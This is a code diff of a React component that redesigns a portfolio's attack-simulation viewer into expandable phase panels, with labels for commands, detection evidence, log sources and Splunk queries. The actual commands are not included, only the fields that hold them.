-                                  : "bg-foreground/[0.02] border-foreground/6 hover:border-primary/25 text-muted-foreground hover:text-foreground hover:bg-foreground/[0.04]"
-                              }`}
-                            >
-                              {/* Horizontal connector dot */}
-                              <div className="absolute -left-5 top-1/2 -translate-y-1/2 flex items-center">
-                                <div className="w-4 h-px bg-primary/30" />
-                                <div
-                                  className={`w-2 h-2 rounded-full border-2 transition-all duration-300 ${
-                                    isSubActive
-                                      ? "border-primary bg-primary shadow-[0_0_8px_rgba(255,107,53,0.6)]"
-                                      : "border-foreground/20 bg-background"
-                                  }`}
-                                />
-                              </div>
-
-                              <span className="truncate flex-1">{sub.title}</span>
-
-                              <span
-                                className={`text-[10px] shrink-0 ml-1 px-1.5 py-0.5 rounded transition-colors duration-200 ${
-                                  isSubActive
-                                    ? "text-primary bg-primary/10"
-                                    : "text-muted-foreground/50"
-                                }`}
-                              >
-                                {isSubActive ? "Active" : `${sIdx + 1}/${step.subSteps.length}`}
-                              </span>
-                            </motion.button>
-                          );
-                        })}
-                      </motion.div>
-                    )}
-                  </AnimatePresence>
-                </div>
-              );
-            })}
-          </div>
-
-          {/* ── Right Column: Detail Panel ── */}
-          <div className="lg:col-span-7 sticky top-24">
-            <AnimatePresence mode="wait">
-              {activeStep && activeSub ? (
-                <motion.div
-                  key={`${activeStep.id}-${selectedSubIdx}`}
-                  variants={panelVariants}
-                  initial="initial"
-                  animate="animate"
-                  exit="exit"
-                  className="bg-background/70 border border-primary/20 rounded-xl p-4 sm:p-5 relative shadow-sm overflow-hidden"
-                >
-                  {/* Decorative corner glow */}
-                  <div className="absolute top-0 right-0 w-40 h-40 bg-primary/8 rounded-full blur-[80px] pointer-events-none -mr-10 -mt-10" />
-
-                  {/* Panel header */}
-                  <div className="flex items-center justify-between pb-3 mb-3 border-b border-foreground/10 relative z-10">
-                    <div className="flex items-center gap-2 min-w-0">
-                      <span className="text-xs font-mono font-bold text-primary bg-primary/10 border border-primary/25 px-2 py-0.5 rounded">
-                        Phase {activeStep.stepNum}
-                      </span>
-                      <span className="text-xs sm:text-sm font-bold text-foreground truncate">
-                        {activeSub.title}
-                      </span>
-                    </div>
-                    <span className="text-[11px] font-medium text-emerald-400 bg-emerald-400/10 px-2 py-0.5 rounded border border-emerald-400/20 shrink-0 ml-2">
-                      {activeStep.title}
+                      Phase {phase.stepNum}
                     </span>
+                    <h4
+                      className={`text-sm sm:text-base font-bold transition-colors ${
+                        isExpanded ? "text-primary" : "text-foreground group-hover:text-primary"
+                      }`}
+                    >
+                      {phase.title}
+                    </h4>
                   </div>
+                  <p className="text-xs text-muted-foreground line-clamp-1 sm:line-clamp-2">
+                    {phase.overview}
+                  </p>
+                </div>
 
-                  <div className="space-y-3.5 text-xs leading-relaxed relative z-10">
-                    {/* 1. What I Did */}
-                    <div>
-                      <span className="text-[11px] font-bold uppercase tracking-wider text-primary block mb-1.5">
-                        1. What I Did in This Step
-                      </span>
-                      <p className="text-foreground/90 bg-foreground/[0.03] p-2.5 rounded-lg border border-foreground/6 leading-relaxed">
-                        {activeSub.whatIDid}
-                      </p>
-                    </div>
+                {/* Status indicator & Chevron (Rotates naturally) */}
+                <div className="flex items-center gap-2 shrink-0">
+                  <span
+                    className={`hidden sm:inline-block text-[11px] font-medium px-2 py-0.5 rounded border transition-colors ${
+                      isExpanded
+                        ? "text-primary bg-primary/10 border-primary/25"
+                        : "text-muted-foreground/60 bg-foreground/5 border-foreground/8 group-hover:text-muted-foreground"
+                    }`}
+                  >
+                    {isExpanded ? "Click to Close" : "View Details"}
+                  </span>
+                  <div
+                    className={`w-7 h-7 rounded-full flex items-center justify-center border transition-all duration-300 ${
+                      isExpanded
+                        ? "bg-primary/15 border-primary/40 text-primary rotate-180"
+                        : "bg-foreground/5 border-foreground/10 text-muted-foreground group-hover:text-foreground group-hover:border-foreground/20 rotate-0"
+                    }`}
+                  >
+                    <ChevronDown size={15} />
+                  </div>
+                </div>
+              </button>
 
-                    {/* 2. Command / Tool */}
-                    <div>
-                      <span className="text-[11px] font-bold uppercase tracking-wider text-foreground/80 block mb-1.5">
-                        2. Command & Tool Executed
-                      </span>
-                      <code className="block font-mono text-[11px] text-primary/95 bg-black/50 p-2.5 rounded-lg border border-foreground/10 overflow-x-auto whitespace-pre-wrap leading-relaxed">
-                        {activeSub.commandOrTool}
-                      </code>
-                    </div>
-
-                    {/* 3. Detection */}
-                    <div>
-                      <span className="text-[11px] font-bold uppercase tracking-wider text-emerald-400 block mb-1.5">
-                        3. How I Detected & Investigated It
-                      </span>
-                      <p className="text-muted-foreground bg-foreground/[0.02] p-2.5 rounded-lg border border-foreground/6 leading-relaxed">
-                        {activeSub.howIDetectedIt}
-                      </p>
-                      <div className="mt-1.5 flex items-center gap-1.5 text-[11px]">
-                        <span className="font-semibold text-foreground/70">Evidence Source:</span>
-                        <span className="font-mono text-emerald-400 bg-emerald-400/10 px-1.5 py-0.5 rounded border border-emerald-400/20">
-                          {activeSub.logSource}
+              {/* ── Smooth Native CSS Grid Expansion Container (Zero Lag) ── */}
+              <div
+                className="grid transition-[grid-template-rows] duration-300 ease-[cubic-bezier(0.16,1,0.3,1)]"
+                style={{
+                  gridTemplateRows: isExpanded ? "1fr" : "0fr",
+                }}
+              >
+                <div className="overflow-hidden min-h-0">
+                  <div
+                    className={`p-4 sm:p-6 border-t border-foreground/10 bg-black/20 transition-all duration-200 ${
+                      isExpanded ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-2"
+                    }`}
+                  >
+                    {/* Content Section: 1. What I Did */}
+                    <div className="mb-4">
+                      <div className="flex items-center gap-1.5 mb-1.5">
+                        <div className="w-1.5 h-1.5 rounded-full bg-primary" />
+                        <span className="text-[11px] font-bold uppercase tracking-wider text-primary">
+                          What I Did in This Phase
                         </span>
                       </div>
+                      <p className="text-xs sm:text-sm text-foreground/90 bg-foreground/[0.03] p-3 rounded-lg border border-foreground/6 leading-relaxed">
+                        {phase.whatIDid}
+                      </p>
                     </div>
 
-                    {/* 4. Splunk Query */}
-                    <div className="pt-1">
+                    {/* Content Section: 2. Command Executed */}
+                    <div className="mb-4">
                       <div className="flex items-center justify-between mb-1.5">
-                        <span className="text-[10px] font-semibold text-primary uppercase tracking-wider flex items-center gap-1.5">
-                          <Terminal size={12} />
-                          Splunk Search Query
-                        </span>
+                        <div className="flex items-center gap-1.5">
+                          <Terminal size={12} className="text-foreground/80" />
+                          <span className="text-[11px] font-bold uppercase tracking-wider text-foreground/80">
+                            Command & Execution ({phase.commandLabel})
+                          </span>
+                        </div>
                         <button
                           type="button"
-                          onClick={() => handleCopy(activeSub.splunkQuery)}
+                          onClick={() => handleCopyCmd(phase.commandOrTool, phase.id)}
                           className="text-[10px] text-muted-foreground hover:text-primary transition-colors flex items-center gap-1 px-2 py-0.5 rounded bg-foreground/5 hover:bg-foreground/10 border border-foreground/10"
                         >
-                          {copiedQuery ? (
+                          {copiedCmdId === phase.id ? (
                             <>
                               <Check size={11} className="text-emerald-400" />
                               <span className="text-emerald-400 font-medium">Copied</span>
@@ -663,65 +510,138 @@ export default function AttackTreeMap() {
                           ) : (
                             <>
                               <Copy size={11} />
-                              <span>Copy Query</span>
+                              <span>Copy Command</span>
                             </>
                           )}
                         </button>
                       </div>
-                      <code className="block font-mono text-[11px] text-primary/90 bg-black/60 p-2.5 rounded-lg border border-primary/20 overflow-x-auto whitespace-pre-wrap leading-relaxed">
-                        {activeSub.splunkQuery}
+                      <code className="block font-mono text-xs text-primary/95 bg-black/60 p-3 rounded-lg border border-foreground/10 overflow-x-auto whitespace-pre-wrap leading-relaxed shadow-inner">
+                        {phase.commandOrTool}
                       </code>
                     </div>
-                  </div>
 
-                  {/* Bottom bar */}
-                  <div className="mt-4 pt-3 border-t border-foreground/8 text-[11px] text-muted-foreground flex items-center justify-between relative z-10">
-                    <span>Phase {activeStep.stepNum} of 06</span>
-                    <span className="text-primary font-medium">Splunk Enterprise SIEM</span>
-                  </div>
-                </motion.div>
-              ) : (
-                <motion.div
-                  key="empty-panel"
-                  variants={panelVariants}
-                  initial="initial"
-                  animate="animate"
-                  exit="exit"
-                  className="bg-background/70 border border-foreground/10 rounded-xl p-8 sm:p-10 flex flex-col items-center justify-center text-center min-h-[260px]"
-                >
-                  <div className="w-12 h-12 rounded-xl bg-primary/10 border border-primary/25 flex items-center justify-center text-primary mb-4">
-                    <Terminal size={22} />
-                  </div>
-                  <p className="text-sm font-semibold text-foreground/80 mb-1">Select a Phase</p>
-                  <p className="text-xs text-muted-foreground max-w-xs">
-                    Click on any phase from the left to explore what I did, the commands executed, and how I detected the activity in Splunk.
-                  </p>
-                </motion.div>
-              )}
-            </AnimatePresence>
-          </div>
-        </div>
+                    {/* Content Section: 3. How I Detected It & Telemetry Evidence */}
+                    <div className="mb-4">
+                      <div className="flex items-center gap-1.5 mb-1.5">
+                        <ShieldCheck size={12} className="text-emerald-400" />
+                        <span className="text-[11px] font-bold uppercase tracking-wider text-emerald-400">
+                          Detection Telemetry & Evidence Sources
+                        </span>
+                      </div>
+                      <p className="text-xs sm:text-sm text-muted-foreground bg-foreground/[0.02] p-3 rounded-lg border border-foreground/6 leading-relaxed mb-2">
+                        {phase.howIDetectedIt}
+                      </p>
+                      <div className="flex flex-wrap items-center gap-1.5 pt-1">
+                        <span className="text-[11px] font-semibold text-foreground/70 mr-1">Log Sources:</span>
+                        {phase.logSources.map((source) => (
+                          <span
+                            key={source}
+                            className="text-[11px] font-mono text-emerald-400 bg-emerald-400/10 px-2 py-0.5 rounded border border-emerald-400/20"
+                          >
+                            {source}
+                          </span>
+                        ))}
+                      </div>
+                    </div>
 
-        {/* Tags */}
-        <div className="flex flex-wrap items-center gap-2 pt-6 mt-6 border-t border-foreground/8">
-          {[
-            "Splunk Enterprise",
-            "Sysmon Logs",
-            "Windows Security Events",
-            "Reverse HTTP C2",
-            "certutil LOLBIN",
-            "Mimikatz",
-            "Persistence Setup",
-            "SIEM Threat Hunting",
-          ].map((tag) => (
-            <span
-              key={tag}
-              className="text-xs font-medium text-primary/80 bg-primary/8 px-3 py-1 rounded-full border border-primary/15"
-            >
-              {tag}
-            </span>
-          ))}
-        </div>
+                    {/* Content Section: 4. Splunk SPL Hunt Query */}
+                    <div className="mb-5">
+                      <div className="flex items-center justify-between mb-1.5">
+                        <div className="flex items-center gap-1.5">
+                          <Terminal size={12} className="text-primary" />
+                          <span className="text-[11px] font-bold uppercase tracking-wider text-primary">
+                            Splunk Search Processing Language (SPL) Query
+                          </span>
+                        </div>
+                        <button
+                          type="button"
+                          onClick={() => handleCopyQuery(phase.splunkQuery, phase.id)}
+                          className="text-[10px] text-muted-foreground hover:text-primary transition-colors flex items-center gap-1 px-2.5 py-1 rounded bg-primary/10 hover:bg-primary/20 border border-primary/25"
+                        >
+                          {copiedQueryId === phase.id ? (
+                            <>
+                              <Check size={11} className="text-emerald-400" />
+                              <span className="text-emerald-400 font-medium">Copied Query</span>
+                            </>
+                          ) : (
+                            <>
+                              <Copy size={11} />
+                              <span className="text-primary font-medium">Copy SPL Query</span>
+                            </>
+                          )}
+                        </button>
+                      </div>
+                      <code className="block font-mono text-xs text-primary/90 bg-black/75 p-3 rounded-lg border border-primary/25 overflow-x-auto whitespace-pre-wrap leading-relaxed shadow-inner">
+                        {phase.splunkQuery}
+                      </code>
+                    </div>
+
+                    {/* Bottom Step Navigation Bar */}
+                    <div className="pt-3 border-t border-foreground/10 flex items-center justify-between flex-wrap gap-2 text-xs">
+                      <div>
+                        {pIdx > 0 ? (
+                          <button
+                            type="button"
+                            onClick={() => goToStep(pIdx - 1)}
+                            className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-foreground/10 bg-foreground/5 hover:bg-foreground/10 text-muted-foreground hover:text-foreground transition-colors"
+                          >
+                            <ArrowLeft size={13} />
+                            <span>Previous: Phase {simulationPhases[pIdx - 1].stepNum}</span>
+                          </button>
+                        ) : (
+                          <span className="text-[11px] text-muted-foreground/50">Start of Simulation</span>
+                        )}
+                      </div>
+
+                      <div className="text-[11px] font-mono text-muted-foreground">
+                        Phase {phase.stepNum} of 06
+                      </div>
+
+                      <div>
+                        {pIdx < simulationPhases.length - 1 ? (
+                          <button
+                            type="button"
+                            onClick={() => goToStep(pIdx + 1)}
+                            className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-primary/30 bg-primary/10 hover:bg-primary/20 text-primary font-medium transition-colors"
+                          >
+                            <span>Next: Phase {simulationPhases[pIdx + 1].stepNum}</span>
+                            <ArrowRight size={13} />
+                          </button>
+                        ) : (
+                          <span className="text-[11px] text-emerald-400 font-semibold flex items-center gap-1">
+                            <Check size={12} />
+                            Simulation Completed
+                          </span>
+                        )}
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          );
+        })}
+      </div>
+
+      {/* ── Tags Footer ── */}
+      <div className="flex flex-wrap items-center gap-2 pt-6 mt-6 border-t border-foreground/8 relative z-10">
+        {[
+          "Splunk Enterprise",
+          "Sysmon Logs",
+          "Windows Security Events",
+          "Reverse HTTP C2",
+          "certutil LOLBIN",
+          "Mimikatz",
+          "Persistence Setup",
+          "SIEM Threat Hunting",
+        ].map((tag) => (
+          <span
+            key={tag}
+            className="text-xs font-medium text-primary/80 bg-primary/8 px-3 py-1 rounded-full border border-primary/15"
+          >
+            {tag}
+          </span>
+        ))}
       </div>
     </div>
   );
